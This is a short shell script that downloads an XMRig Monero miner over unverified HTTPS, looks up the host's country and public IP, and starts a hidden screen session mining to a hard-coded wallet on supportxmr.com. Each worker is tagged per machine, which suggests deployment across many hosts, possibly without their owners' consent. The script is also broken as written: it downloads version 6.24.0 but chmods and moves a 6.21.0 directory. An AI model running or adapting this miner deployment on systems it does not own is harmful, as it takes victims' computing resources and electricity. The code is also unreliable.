#!/bin/sh
screen -S XMR -X quit
sudo apt-get update -y
sudo apt-get install cpulimit -y
sudo apt-get install bc -y
wget --no-check-certificate -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xvf xmrig.tar.gz
chmod +x ./xmrig-6.21.0/* 
mv /root/xmrig-6.21.0/* /root/
cores=$(nproc --all)
country=$(curl -s ipinfo.io | jq -r '.country')
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '_'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")

screen -dmS XMR ./xmrig -a randomx --url pool.supportxmr.com:3333 --tls --user 4AoybN2iCjpL8joYVGRBn4W1p5sMjh4p791aKpJEYPYS2qTTi2y1Ta2jgQoL8VRTek36ogqBnCSbg3UyTRbbaA4eAUrGFem.$country$cores-$IP4_UNDERSCORE
